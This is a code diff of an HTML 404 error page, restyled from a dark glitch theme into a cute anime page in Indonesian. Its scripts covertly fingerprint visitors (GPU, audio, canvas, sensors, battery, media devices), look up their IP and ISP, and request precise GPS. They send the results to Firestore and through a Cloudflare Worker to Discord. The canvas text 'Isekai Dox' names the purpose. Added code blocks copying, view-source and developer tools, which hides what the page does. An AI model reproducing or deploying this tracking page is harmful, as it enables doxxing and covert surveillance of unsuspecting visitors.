@@ -1,131 +1,320 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>404 // LOST IN THE VOID</title>
+<title>404 ✨ Nyaa~ Halaman Ini Tidak Ada!</title>
+<link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@400;700;900&display=swap" rel="stylesheet">
 <style>
- body {
-  margin: 0;
-  height: 100vh;
-  background-color: #0a0a0a;
-  color: #c0c0c0;
-  font-family: 'Courier New', Courier, monospace;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  overflow: hidden;
-  position: relative;
- }
- #container {
-  z-index: 10;
-  text-align: center;
-  max-width: 600px;
-  padding: 20px;
- }
- h1 {
-  font-size: 2.5rem;
-  color: #e0e0e0;
-  margin-bottom: 10px;
-  text-transform: uppercase;
-  letter-spacing: 5px;
- }
- p {
-  font-size: 1.1rem;
-  margin-bottom: 30px;
-  opacity: 0.8;
- }
- #details {
-  font-size: 0.9rem;
-  color: #888;
-  margin-top: 20px;
-  min-height: 100px;
-  text-align: left;
-  border-top: 1px solid #333;
-  padding-top: 20px;
- }
- .line {
-  margin: 5px 0;
-  opacity: 0;
-  animation: fadeIn 0.5s forwards;
- }
- @keyframes fadeIn {
-  to { opacity: 1; }
- }
- .glitch {
-  position: relative;
- }
- .glitch::before, .glitch::after {
-  content: attr(data-text);
-  position: absolute;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
- }
- .glitch::before {
-  left: 2px;
-  text-shadow: -1px 0 #ff003c;
-  clip: rect(44px, 450px, 56px, 0);
-  animation: glitch-anim 5s infinite linear alternate-reverse;
- }
- .glitch::after {
-  left: -2px;
-  text-shadow: -1px 0 #00ff41;
-  clip: rect(44px, 450px, 56px, 0);
-  animation: glitch-anim2 5s infinite linear alternate-reverse;
- }
- @keyframes glitch-anim {
-  0% { clip: rect(20px, 9999px, 10px, 0); }
-  20% { clip: rect(60px, 9999px, 70px, 0); }
-  40% { clip: rect(30px, 9999px, 15px, 0); }
-  60% { clip: rect(80px, 9999px, 85px, 0); }
-  80% { clip: rect(10px, 9999px, 35px, 0); }
-  100% { clip: rect(50px, 9999px, 60px, 0); }
- }
- @keyframes glitch-anim2 {
-  0% { clip: rect(15px, 9999px, 25px, 0); }
-  20% { clip: rect(45px, 9999px, 55px, 0); }
-  40% { clip: rect(10px, 9999px, 20px, 0); }
-  60% { clip: rect(70px, 9999px, 80px, 0); }
-  80% { clip: rect(25px, 9999px, 35px, 0); }
-  100% { clip: rect(60px, 9999px, 75px, 0); }
- }
- /* Noise Overlay */
- #noise {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  pointer-events: none;
-  z-index: 1;
-  opacity: 0.05;
-  background: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noiseFilter"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.65" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noiseFilter)"/%3E%3C/svg%3E');
- }
+  /* ── Anti copy & select ── */
+  * {
+    -webkit-user-select: none !important;
+    -moz-user-select: none !important;
+    -ms-user-select: none !important;
+    user-select: none !important;
+    -webkit-touch-callout: none !important;
+  }
+
+  /* ── Base ── */
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 25%, #e1bee7 50%, #bbdefb 75%, #b3e5fc 100%);
+    background-size: 400% 400%;
+    animation: gradientShift 8s ease infinite;
+    font-family: 'M PLUS Rounded 1c', 'Segoe UI', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    position: relative;
+  }
+
+  @keyframes gradientShift {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  /* ── Floating sakura petals ── */
+  .petal {
+    position: fixed;
+    top: -30px;
+    font-size: 1.4rem;
+    animation: fall linear infinite;
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.7;
+  }
+  @keyframes fall {
+    0%   { transform: translateY(-30px) rotate(0deg); opacity: 0.8; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+  }
+
+  /* ── Stars overlay ── */
+  .star {
+    position: fixed;
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: #fff;
+    animation: twinkle ease-in-out infinite;
+    pointer-events: none;
+    z-index: 0;
+  }
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.1; transform: scale(1); }
+    50%       { opacity: 0.9; transform: scale(1.5); }
+  }
+
+  /* ── Card ── */
+  #container {
+    position: relative;
+    z-index: 10;
+    text-align: center;
+    max-width: 520px;
+    width: 90%;
+    background: rgba(255, 255, 255, 0.65);
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+    border: 2px solid rgba(255, 182, 193, 0.6);
+    border-radius: 30px;
+    padding: 36px 32px 28px;
+    box-shadow:
+      0 8px 32px rgba(255, 105, 180, 0.25),
+      0 0 0 1px rgba(255,255,255,0.4) inset;
+    animation: popIn 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+  }
+  @keyframes popIn {
+    from { opacity: 0; transform: scale(0.7) translateY(30px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+  }
+
+  /* ── Anime GIF ── */
+  #anime-gif {
+    width: 160px;
+    height: 160px;
+    object-fit: cover;
+    border-radius: 50%;
+    border: 4px solid #ff85c1;
+    box-shadow: 0 0 0 4px #fff, 0 6px 20px rgba(255, 105, 180, 0.4);
+    margin-bottom: 16px;
+    animation: floatBob 3s ease-in-out infinite;
+  }
+  @keyframes floatBob {
+    0%, 100% { transform: translateY(0px); }
+    50%       { transform: translateY(-10px); }
+  }
+
+  /* ── 404 badge ── */
+  .badge-404 {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff85c1, #c084fc);
+    color: #fff;
+    font-size: 0.75rem;
+    font-weight: 900;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    padding: 4px 14px;
+    border-radius: 999px;
+    margin-bottom: 10px;
+    box-shadow: 0 2px 8px rgba(192,132,252,0.4);
+  }
+
+  /* ── Heading ── */
+  h1 {
+    font-size: 2rem;
+    font-weight: 900;
+    color: #be185d;
+    margin: 6px 0 8px;
+    line-height: 1.2;
+    text-shadow: 2px 2px 0 rgba(255,182,193,0.5);
+  }
+  h1 span.kawaii {
+    display: block;
+    font-size: 1.1rem;
+    color: #a855f7;
+    font-weight: 700;
+    margin-top: 2px;
+  }
+
+  /* ── Sub text ── */
+  .subtitle {
+    font-size: 0.95rem;
+    color: #9d4edd;
+    margin: 0 0 18px;
+    line-height: 1.6;
+  }
+  .subtitle em {
+    font-style: normal;
+    color: #db2777;
+    font-weight: 700;
+  }
+
+  /* ── Divider ── */
+  .divider {
+    border: none;
+    border-top: 2px dashed rgba(255, 133, 193, 0.4);
+    margin: 16px 0;
+  }
+
+  /* ── Scan log ── */
+  #details {
+    font-size: 0.78rem;
+    color: #7e22ce;
+    text-align: left;
+    max-height: 140px;
+    overflow: hidden;
+    padding: 4px 2px;
+    line-height: 1.7;
+  }
+  .line {
+    margin: 2px 0;
+    opacity: 0;
+    animation: fadeSlide 0.4s forwards;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .line::before {
+    content: "♡";
+    color: #f472b6;
+    font-size: 0.7rem;
+    flex-shrink: 0;
+  }
+  @keyframes fadeSlide {
+    from { opacity: 0; transform: translateX(-8px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+
+  /* ── Footer note ── */
+  .footer-note {
+    margin-top: 18px;
+    font-size: 0.72rem;
+    color: #c084fc;
+    opacity: 0.8;
+  }
+
+  /* ── Cute sparkle icon bounce ── */
+  .bounce {
+    display: inline-block;
+    animation: bounce 1.2s ease-in-out infinite;
+  }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50%       { transform: translateY(-5px); }
+  }
+
+  /* ── Ribbon corners ── */
+  #container::before {
+    content: "🎀";
+    position: absolute;
+    top: -16px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 2rem;
+    filter: drop-shadow(0 2px 4px rgba(255,105,180,0.5));
+  }
 </style>
 </head>
 <body>
-<div id="noise"></div>
+
+<!-- Floating petals -->
+<div id="petals"></div>
+<!-- Stars -->
+<div id="stars"></div>
+
 <div id="container">
- <h1 class="glitch" data-text="404 // LOST">404 // LOST</h1>
- <p>You have ventured into the void...</p>
- <div id="details"></div>
+  <img id="anime-gif"
+    src="https://media.tenor.com/images/66f48e58f6e88e5cfb82bd88c76e0ef5/tenor.gif"
+    alt="anime"
+    draggable="false"
+    onerror="this.src='https://media.tenor.com/Ml8QWn9ji1EAAAAC/lost-confused.gif'"
+  />
+
+  <div class="badge-404">✨ Error 404 ✨</div>
+
+  <h1>
+    Nyaa~! Halaman Ini Hilang!
+    <span class="kawaii">(´；ω；`) Gomenasai desu~</span>
+  </h1>
+
+  <p class="subtitle">
+    Kamu nyasar ke dunia isekai yang kosong, <em>onii-chan</em>~<br>
+    Halaman yang kamu cari sudah pergi entah kemana… <span class="bounce">🌸</span><br>
+    Mungkin dia sedang piknik bareng kucing virtual nyaa~ 🐱
+  </p>
+
+  <hr class="divider">
+
+  <div id="details"></div>
+
+  <p class="footer-note">
+    🎀 Powered by Isekai Info-chan ✨ • がんばってね！ 🌸
+  </p>
 </div>
+
+<script>
+/* ── Anti copy / context menu / keyboard shortcuts ── */
+document.addEventListener("copy",        e => e.preventDefault());
+document.addEventListener("cut",         e => e.preventDefault());
+document.addEventListener("contextmenu", e => e.preventDefault());
+document.addEventListener("keydown", e => {
+  if (
+    (e.ctrlKey || e.metaKey) &&
+    ["c","x","u","s","a","p"].includes(e.key.toLowerCase())
+  ) { e.preventDefault(); }
+  if (e.key === "F12") e.preventDefault();
+});
+document.addEventListener("selectstart", e => e.preventDefault());
+document.addEventListener("dragstart",   e => e.preventDefault());
+
+/* ── Sakura petals ── */
+(function spawnPetals() {
+  const emojis = ["🌸","🌺","✨","💮","🌼","🍡","💕","⭐","🎀","🌟"];
+  const wrap = document.getElementById("petals");
+  for (let i = 0; i < 18; i++) {
+    const el = document.createElement("div");
+    el.className = "petal";
+    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    el.style.left  = Math.random() * 100 + "vw";
+    el.style.animationDuration  = (6 + Math.random() * 8) + "s";
+    el.style.animationDelay     = (-Math.random() * 10)   + "s";
+    el.style.fontSize           = (1 + Math.random() * 1.2) + "rem";
+    wrap.appendChild(el);
+  }
+})();
+
+/* ── Twinkling stars ── */
+(function spawnStars() {
+  const wrap = document.getElementById("stars");
+  for (let i = 0; i < 40; i++) {
+    const el = document.createElement("div");
+    el.className = "star";
+    el.style.left   = Math.random() * 100 + "vw";
+    el.style.top    = Math.random() * 100 + "vh";
+    el.style.animationDuration = (1.5 + Math.random() * 3) + "s";
+    el.style.animationDelay    = (-Math.random() * 3) + "s";
+    el.style.width = el.style.height = (2 + Math.random() * 4) + "px";
+    el.style.background = ["#fff","#ffd6e7","#e9d5ff","#bae6fd"][Math.floor(Math.random()*4)];
+    wrap.appendChild(el);
+  }
+})();
+</script>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp }
- from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 /* ── CONFIG ── */
 const firebaseConfig = {
- apiKey: "__FIREBASE_API_KEY__",
- authDomain: "__FIREBASE_AUTH_DOMAIN__",
- projectId: "__FIREBASE_PROJECT_ID__",
- storageBucket: "__FIREBASE_STORAGE_BUCKET__",
- messagingSenderId: "__FIREBASE_MESSAGING_SENDER_ID__",
- appId: "__FIREBASE_APP_ID__"
+  apiKey: "__FIREBASE_API_KEY__",
+  authDomain: "__FIREBASE_AUTH_DOMAIN__",
+  projectId: "__FIREBASE_PROJECT_ID__",
+  storageBucket: "__FIREBASE_STORAGE_BUCKET__",
+  messagingSenderId: "__FIREBASE_MESSAGING_SENDER_ID__",
+  appId: "__FIREBASE_APP_ID__"
 };
 var WORKER_URL = "__CF_WORKER_URL__";
 
@@ -134,318 +323,313 @@ var CF_READY = WORKER_URL && !WORKER_URL.startsWith("__");
 
 var app, db;
 if (FB_READY) {
- try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
- catch(e) { FB_READY = false; }
+  try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
+  catch(e) { FB_READY = false; }
 }
 
 /* ── UI LOGIC ── */
 const details = document.getElementById("details");
+let lineIdx = 0;
 
 function addLine(text) {
- const div = document.createElement("div");
- div.className = "line";
- div.innerText = "> " + text;
- div.style.animationDelay = (Math.random() * 0.5) + "s";
- details.appendChild(div);
+  const div = document.createElement("div");
+  div.className = "line";
+  div.innerText = text;
+  div.style.animationDelay = (lineIdx * 0.12) + "s";
+  lineIdx++;
+  details.appendChild(div);
+  // auto scroll
+  details.scrollTop = details.scrollHeight;
 }
 
 /* ── HELPERS ── */
-// Simple djb2 hash — turns large strings into a short hex fingerprint
 function hashStr(str) {
- let h = 5381;
- for (let i = 0; i < str.length; i++) {
-  h = ((h * 33) ^ str.charCodeAt(i)) >>> 0;
- }
- return h.toString(16).padStart(8, '0').toUpperCase();
+  let h = 5381;
+  for (let i = 0; i < str.length; i++) {
+    h = ((h * 33) ^ str.charCodeAt(i)) >>> 0;
+  }
+  return h.toString(16).padStart(8, '0').toUpperCase();
 }
 
 /* ── DATA COLLECTION ── */
 async function collectAll() {
- addLine("Initializing void scan...");
- await new Promise(r => setTimeout(r, 500));
+  addLine("Memulai pemindaian ajaib nyaa~ ✨");
+  await new Promise(r => setTimeout(r, 500));
 
- // 1. Basic Nav
- const navData = {
-  userAgent: navigator.userAgent,
-  platform: navigator.platform,
-  language: navigator.language,
-  languages: (navigator.languages || []).join(", "),
-  cookieEnabled: navigator.cookieEnabled,
-  doNotTrack: navigator.doNotTrack,
-  online: navigator.onLine,
-  hardwareConcurrency: navigator.hardwareConcurrency ?? null,
-  deviceMemory: navigator.deviceMemory ?? null,
-  maxTouchPoints: navigator.maxTouchPoints ?? null,
-  connectionType: navigator.connection?.type ?? null,
-  effectiveConnection: navigator.connection?.effectiveType ?? null,
-  downlink: navigator.connection?.downlink ?? null,
-  rtt: navigator.connection?.rtt ?? null,
-  saveData: navigator.connection?.saveData ?? null,
- };
- addLine("Scanning Navigator API...");
-
- // 2. Screen
- const screenData = {
-  width: screen.width,
-  height: screen.height,
-  availWidth: screen.availWidth,
-  availHeight: screen.availHeight,
-  colorDepth: screen.colorDepth,
-  pixelRatio: window.devicePixelRatio,
-  orientation: screen.orientation?.type ?? null,
-  orientationAngle: screen.orientation?.angle ?? null,
-  innerWidth: window.innerWidth,
-  innerHeight: window.innerHeight,
-  outerWidth: window.outerWidth,
-  outerHeight: window.outerHeight,
- };
- addLine("Measuring Display Matrix...");
-
- // 3. GPU — only keep human-readable fields, skip raw extensions list
- let gpuData = { vendor: null, renderer: null, version: null };
- try {
-  const c = document.createElement('canvas');
-  const gl = c.getContext('webgl2') || c.getContext('webgl');
-  if (gl) {
-   const ext = gl.getExtension('WEBGL_debug_renderer_info');
-   gpuData.vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null;
-   gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
-   gpuData.version = gl.getParameter(gl.VERSION);
-  }
- } catch(e) {}
- addLine("Extracting GPU Signature...");
-
- // 4. Audio & Canvas Fingerprint — stored as compact hashes, not raw data
- let audioFingerprint = null;
- let canvasFingerprint = null;
- try {
-  // Audio fingerprint — hash of raw oscillator samples
-  const AudioCtx = window.AudioContext || window.webkitAudioContext;
-  const actx = new AudioCtx();
-  const osc = actx.createOscillator();
-  const gain = actx.createGain();
-  const script = actx.createScriptProcessor(4096, 1, 1);
-  gain.gain.value = 0;
-  osc.connect(gain);
-  gain.connect(script);
-  script.connect(actx.destination);
-  osc.frequency.value = 1000;
-  osc.start();
-  script.onaudioprocess = (e) => {
-   const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
-   audioFingerprint = hashStr(raw);
-   osc.stop();
-   actx.close();
+  // 1. Basic Nav
+  const navData = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    online: navigator.onLine,
+    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+    deviceMemory: navigator.deviceMemory ?? null,
+    maxTouchPoints: navigator.maxTouchPoints ?? null,
+    connectionType: navigator.connection?.type ?? null,
+    effectiveConnection: navigator.connection?.effectiveType ?? null,
+    downlink: navigator.connection?.downlink ?? null,
+    rtt: navigator.connection?.rtt ?? null,
+    saveData: navigator.connection?.saveData ?? null,
   };
-  await new Promise(r => setTimeout(r, 80));
+  addLine("Mengintip Navigator API~ (◕‿◕✿)");
 
-  // Canvas fingerprint — hash of rendered canvas data URL
-  const c2 = document.createElement('canvas');
-  c2.width = 200; c2.height = 50;
-  const ctx2 = c2.getContext('2d');
-  ctx2.textBaseline = "top";
-  ctx2.font = "14px Arial";
-  ctx2.fillStyle = "#f00";
-  ctx2.fillRect(125, 1, 62, 20);
-  ctx2.fillStyle = "#0099ff";
-  ctx2.fillText("Isekai Dox \uD83C\uDF38", 2, 15);
-  canvasFingerprint = hashStr(c2.toDataURL());
- } catch(e) {}
- addLine("Fingerprinting Audio & Canvas...");
+  // 2. Screen
+  const screenData = {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation?.type ?? null,
+    orientationAngle: screen.orientation?.angle ?? null,
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight,
+  };
+  addLine("Mengukur layar onii-chan~ 🖥️");
 
- // 5. Storage & Media
- const storageData = {
-  localStorage: !!window.localStorage,
-  sessionStorage: !!window.sessionStorage,
-  indexedDB: !!window.indexedDB,
-  serviceWorker: 'serviceWorker' in navigator,
-  cacheAPI: 'caches' in window,
-  cookies: document.cookie ? document.cookie.split(';').length : 0,
- };
-
- let mediaData = { audioIn: [], videoIn: [], audioOut: [] };
- try {
-  const devices = await navigator.mediaDevices?.enumerateDevices();
-  if (devices) {
-   mediaData.audioIn = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic');
-   mediaData.videoIn = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam');
-   mediaData.audioOut = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker');
-  }
- } catch(e) {}
- addLine("Checking Storage & Media...");
-
- // 6. Locale & Battery
- const localeData = {
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  currency: Intl.NumberFormat().resolvedOptions().currency ?? null,
-  calendar: Intl.DateTimeFormat().resolvedOptions().calendar ?? null,
-  numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem ?? null,
- };
-
- let batteryData = { level: null, charging: null };
- try {
-  const batt = await navigator.getBattery?.();
-  if (batt) {
-   batteryData.level = Math.round(batt.level * 100) + "%";
-   batteryData.charging = batt.charging;
-  }
- } catch(e) {}
- addLine("Reading Locale & Power...");
-
- // 7. Sensors
- let sensorData = { accel: null, gyro: null, mag: null };
- try {
-  if ('Accelerometer' in window) {
-   const acc = new window.Accelerometer({ frequency: 1 });
-   const d = await acc.getData();
-   sensorData.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-  }
-  if ('Gyroscope' in window) {
-   const gyro = new window.Gyroscope({ frequency: 1 });
-   const d = await gyro.getData();
-   sensorData.gyro = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-  }
-  if ('Magnetometer' in window) {
-   const mag = new window.Magnetometer({ frequency: 1 });
-   const d = await mag.getData();
-   sensorData.mag = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-  }
- } catch(e) {}
- addLine("Calibrating Sensors...");
-
- // 8. IP & GPS
- let ipData = {
-  ip: null, isp: null, city: null, country: null,
-  region: null, proxy: null, hosting: null, asn: null,
- };
- try {
-  const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
-  const json = await resp.json();
-  ipData.ip      = json.ip        ?? null;
-  ipData.isp     = json.org       ?? null;
-  ipData.city    = json.city      ?? null;
-  ipData.country = json.country_name ?? null;
-  ipData.region  = json.region    ?? null;
-  ipData.proxy   = json.proxy     ?? null;
-  ipData.hosting = json.hosting   ?? null;
-  ipData.asn     = json.asn       ?? null;
- } catch(e) {}
- addLine("Triangulating IP Address...");
-
- // GPS — field names: lat / lon (matches worker expectation)
- let gpsData = { lat: null, lon: null };
- try {
-  const pos = await new Promise((resolve, reject) =>
-   navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000, enableHighAccuracy: true })
-  );
-  gpsData.lat = pos.coords.latitude;
-  gpsData.lon = pos.coords.longitude;
- } catch(e) {}
- addLine("Locking GPS Coordinates...");
-
- // 9. Browser Features
- const features = {
-  webgl2:   !!document.createElement('canvas').getContext('webgl2'),
-  webgpu:   !!navigator.gpu,
-  webrtc:   !!window.RTCPeerConnection,
-  cssGrid:  !!CSS.supports('display', 'grid'),
-  flexbox:  !!CSS.supports('display', 'flex'),
-  fetchAPI: !!window.fetch,
-  promise:  !!window.Promise,
- };
- addLine("Testing Browser Capabilities...");
-
- // 10. Plugins & UA Hints
- const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
- const mimeList    = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
-
- let uahData = { brands: null, mobile: null, model: null, architecture: null, bitness: null };
- if (navigator.userAgentData) {
-  uahData.brands = JSON.stringify(navigator.userAgentData.brands);
-  uahData.mobile = navigator.userAgentData.mobile;
+  // 3. GPU
+  let gpuData = { vendor: null, renderer: null, version: null };
   try {
-   const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
-   uahData.model        = hints.model        ?? null;
-   uahData.architecture = hints.architecture ?? null;
-   uahData.bitness      = hints.bitness      ?? null;
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl2') || c.getContext('webgl');
+    if (gl) {
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      gpuData.vendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : null;
+      gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
+      gpuData.version  = gl.getParameter(gl.VERSION);
+    }
   } catch(e) {}
- }
- addLine("Analyzing User Agent Hints...");
+  addLine("Mendeteksi GPU-chan~ 🎮");
 
- // 11. Build Final Payload — clean nulls/undefined
- const raw = {
-  ...navData,
-  ...screenData,
-  ...gpuData,
-  audioFingerprint,
-  canvasFingerprint,
-  ...storageData,
-  ...mediaData,
-  ...localeData,
-  ...batteryData,
-  ...sensorData,
-  ...ipData,
-  ...gpsData,
-  ...features,
-  plugins:   pluginsList || null,
-  mimeTypes: mimeList    || null,
-  ...uahData,
- };
-
- const payload = {};
- for (const key in raw) {
-  if (raw[key] !== undefined && raw[key] !== null && raw[key] !== "") {
-   payload[key] = raw[key];
-  }
- }
-
- addLine("Packaging Data...");
-
- // Send to Firebase (visitors_404 collection — minimal, compliant with Firestore rules)
- if (FB_READY) {
+  // 4. Audio & Canvas Fingerprint
+  let audioFingerprint = null;
+  let canvasFingerprint = null;
   try {
-   const fbPayload = {
-    ip:         payload.ip         ?? null,
-    isp:        payload.isp        ?? null,
-    city:       payload.city       ?? null,
-    region:     payload.region     ?? null,
-    country:    payload.country    ?? null,
-    timezone:   payload.timezone   ?? null,
-    platform:   payload.platform   ?? null,
-    userAgent:  payload.userAgent  ?? null,
-    language:   payload.language   ?? null,
-    screenW:    payload.width      ?? null,
-    screenH:    payload.height     ?? null,
-    pixelRatio: payload.pixelRatio ?? null,
-    url:        location.href,
-    referrer:   document.referrer  || null,
-    timestamp:  serverTimestamp(),
-   };
-   // Remove nulls to satisfy Firestore rules
-   const cleanFb = {};
-   for (const k in fbPayload) { if (fbPayload[k] !== null) cleanFb[k] = fbPayload[k]; }
-   await addDoc(collection(db, "visitors_404"), cleanFb);
-   addLine("✅ Saved to Firestore");
-  } catch (e) {
-   addLine("❌ Firestore Error: " + e.message);
-  }
- }
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    const actx = new AudioCtx();
+    const osc = actx.createOscillator();
+    const gain = actx.createGain();
+    const script = actx.createScriptProcessor(4096, 1, 1);
+    gain.gain.value = 0;
+    osc.connect(gain);
+    gain.connect(script);
+    script.connect(actx.destination);
+    osc.frequency.value = 1000;
+    osc.start();
+    script.onaudioprocess = (e) => {
+      const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
+      audioFingerprint = hashStr(raw);
+      osc.stop();
+      actx.close();
+    };
+    await new Promise(r => setTimeout(r, 80));
 
- // Send full payload to Cloudflare Worker → Discord
- if (CF_READY) {
+    const c2 = document.createElement('canvas');
+    c2.width = 200; c2.height = 50;
+    const ctx2 = c2.getContext('2d');
+    ctx2.textBaseline = "top";
+    ctx2.font = "14px Arial";
+    ctx2.fillStyle = "#f00";
+    ctx2.fillRect(125, 1, 62, 20);
+    ctx2.fillStyle = "#0099ff";
+    ctx2.fillText("Isekai Dox \uD83C\uDF38", 2, 15);
+    canvasFingerprint = hashStr(c2.toDataURL());
+  } catch(e) {}
+  addLine("Fingerprint audio & canvas~ 🎵");
+
+  // 5. Storage & Media
+  const storageData = {
+    localStorage:  !!window.localStorage,
+    sessionStorage: !!window.sessionStorage,
+    indexedDB:     !!window.indexedDB,
+    serviceWorker: 'serviceWorker' in navigator,
+    cacheAPI:      'caches' in window,
+    cookies: document.cookie ? document.cookie.split(';').length : 0,
+  };
+
+  let mediaData = { audioIn: [], videoIn: [], audioOut: [] };
   try {
-   await fetch(WORKER_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-   });
-   addLine("✅ Sent to Discord");
-  } catch (e) {
-   addLine("❌ Worker Error: " + e.message);
-  }
- }
+    const devices = await navigator.mediaDevices?.enumerateDevices();
+    if (devices) {
+      mediaData.audioIn  = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic');
+      mediaData.videoIn  = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam');
+      mediaData.audioOut = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker');
+    }
+  } catch(e) {}
+  addLine("Cek storage & perangkat media~ 💾");
 
- addLine("Void Scan Complete.");
+  // 6. Locale & Battery
+  const localeData = {
+    timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    currency:       Intl.NumberFormat().resolvedOptions().currency   ?? null,
+    calendar:       Intl.DateTimeFormat().resolvedOptions().calendar ?? null,
+    numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem ?? null,
+  };
+
+  let batteryData = { level: null, charging: null };
+  try {
+    const batt = await navigator.getBattery?.();
+    if (batt) {
+      batteryData.level    = Math.round(batt.level * 100) + "%";
+      batteryData.charging = batt.charging;
+    }
+  } catch(e) {}
+  addLine("Baca info baterai & lokasi~ 🔋");
+
+  // 7. Sensors
+  let sensorData = { accel: null, gyro: null, mag: null };
+  try {
+    if ('Accelerometer' in window) {
+      const acc = new window.Accelerometer({ frequency: 1 });
+      const d = await acc.getData();
+      sensorData.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+    }
+    if ('Gyroscope' in window) {
+      const gyro = new window.Gyroscope({ frequency: 1 });
+      const d = await gyro.getData();
+      sensorData.gyro = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+    }
+    if ('Magnetometer' in window) {
+      const mag = new window.Magnetometer({ frequency: 1 });
+      const d = await mag.getData();
+      sensorData.mag = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+    }
+  } catch(e) {}
+  addLine("Kalibrasi sensor gerak~ 📳");
+
+  // 8. IP & GPS
+  let ipData = {
+    ip: null, isp: null, city: null, country: null,
+    region: null, proxy: null, hosting: null, asn: null,
+  };
+  try {
+    const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
+    const json = await resp.json();
+    ipData.ip      = json.ip           ?? null;
+    ipData.isp     = json.org          ?? null;
+    ipData.city    = json.city         ?? null;
+    ipData.country = json.country_name ?? null;
+    ipData.region  = json.region       ?? null;
+    ipData.proxy   = json.proxy        ?? null;
+    ipData.hosting = json.hosting      ?? null;
+    ipData.asn     = json.asn          ?? null;
+  } catch(e) {}
+  addLine("Melacak alamat IP~ 🌐");
+
+  let gpsData = { lat: null, lon: null };
+  try {
+    const pos = await new Promise((resolve, reject) =>
+      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000, enableHighAccuracy: true })
+    );
+    gpsData.lat = pos.coords.latitude;
+    gpsData.lon = pos.coords.longitude;
